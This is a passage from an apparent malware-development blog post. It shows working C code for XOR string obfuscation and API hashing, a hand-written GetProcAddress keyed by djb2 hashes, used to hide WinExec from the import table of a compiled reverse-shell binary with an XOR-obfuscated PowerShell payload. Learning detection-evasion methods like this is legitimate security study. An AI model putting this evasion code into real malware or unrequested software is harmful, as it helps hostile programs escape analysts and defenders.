</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>xor</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>string</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=o>*</span><span class=n>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>string</span> <span class=o>-=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>string</span><span class=o>++</span> <span class=o>^=</span> <span class=p>(</span><span class=kt>char</span><span class=p>)(</span><span class=n>key</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>my_GetProcAddress</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>dll_handle</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hashed_function_name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span> <span class=n>p_DOS_HDR</span>  <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_DOS_HEADER</span><span class=o>*</span><span class=p>)</span> <span class=n>dll_handle</span><span class=p>;</span> <span class=c1>// convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span> <span class=n>p_NT_HDR</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_NT_HEADERS</span><span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_DOS_HDR</span><span class=o>-&gt;</span><span class=n>e_lfanew</span> <span class=p>);</span> <span class=c1>// NT HEADERS are located at the raw offset defined in the e_lfanew header
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span> <span class=n>export_table</span> <span class=o>=</span> <span class=p>(</span><span class=n>IMAGE_EXPORT_DIRECTORY</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>p_NT_HDR</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>].</span><span class=n>VirtualAddress</span><span class=p>);</span> <span class=c1>// .edata section
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>numberOfNames</span> <span class=o>=</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>NumberOfNames</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_address</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span><span class=o>*</span> <span class=n>functions_names</span> <span class=o>=</span> <span class=p>(</span><span class=n>DWORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNames</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>WORD</span><span class=o>*</span>  <span class=n>functions_ordinal</span> <span class=o>=</span> <span class=p>(</span><span class=n>WORD</span><span class=o>*</span><span class=p>)((</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>export_table</span><span class=o>-&gt;</span><span class=n>AddressOfNameOrdinals</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>numberOfNames</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>name</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_names</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=c1>// printf(&#34;%s\n&#34;,name);
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>hashed_function_name</span> <span class=o>==</span> <span class=nf>hash_djb2</span><span class=p>(</span><span class=n>name</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>dll_handle</span> <span class=o>+</span> <span class=n>functions_address</span><span class=p>[</span><span class=n>functions_ordinal</span><span class=p>[</span><span class=n>i</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>hash_djb2</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hash</span> <span class=o>=</span> <span class=mi>5381</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>c</span> <span class=o>=</span> <span class=o>*</span><span class=n>str</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>hash</span> <span class=o>=</span> <span class=p>((</span><span class=n>hash</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>hash</span><span class=p>)</span> <span class=o>+</span> <span class=n>c</span><span class=p>;</span> <span class=cm>/* hash * 33 + c */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hash</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><em>i changed my mind, instead of using GetModuleHandle() which just returns the base address only if a module is loaded in memory I used LoadLibrary() wich will load the library if it is not loaded and also return its handle.</em></p><p>we compile it :</p><pre tabindex=0><code>gcc reverse-shell.c -s -o reverse-shell.exe
</code></pre><p>I just obfuscated a bit the powershell payload with a simple xor and compile it with the -s flag to strip our PE. Stripping a PE means to discard these debugging symbols (like the function name). Stripping a binary reduces its size on the disk and makes it a little more difficult to debug and reverse engineer.</p><p>our main function now :</p><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/obfuscate_rev-shell.png alt="obfuscate rev-shell"></p><p>and our own GetProcAddress is a bit hard to recognize (of course an experimented reverse engineer will recognize it easily):</p><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/getProcAddr_re.png alt="GetProcAddress RE"></p><p>The WinExec and GetProcAddress functions are now totally absent in the IAT.</p><p><img loading=lazy src=/img/posts/Windows_API_hashing-part1/nowinexec_nogetprocaddr.png alt="final IAT"></p><h3 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h3><p>That&rsquo;s all for this post, I hope you enjoyed it. If I said some things wrong or if I made any mistake feel free to report them to me. Same, if you don&rsquo;t understand something contact me on Discord or Twitter. I will be happy to help you. Next time we will see how to make our own GetModuleHandle by parsing the Process Block Environment and make a PE without an import table.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://trikkss.github.io/tags/reverse-engineering/>Reverse engineering</a></li><li><a href=https://trikkss.github.io/tags/malware/>malware</a></li><li><a href=https://trikkss.github.io/tags/c/>C</a></li><li><a href=https://trikkss.github.io/tags/windows/>Windows</a></li><li><a href=https://trikkss.github.io/tags/pe/>PE</a></li><li><a href=https://trikkss.github.io/tags/dll/>DLL</a></li></ul><nav class=paginav><a class=prev href=https://trikkss.github.io/posts/iat_hooking/><span class=title>« Prev</span><br><span>Malware - IAT Hooking</span></a>
<a class=next href=https://trikkss.github.io/posts/protonic-vault-wu/><span class=title>Next »</span><br><span>Protonic Vault write up</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://trikkss.github.io/>TRIKKSS Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>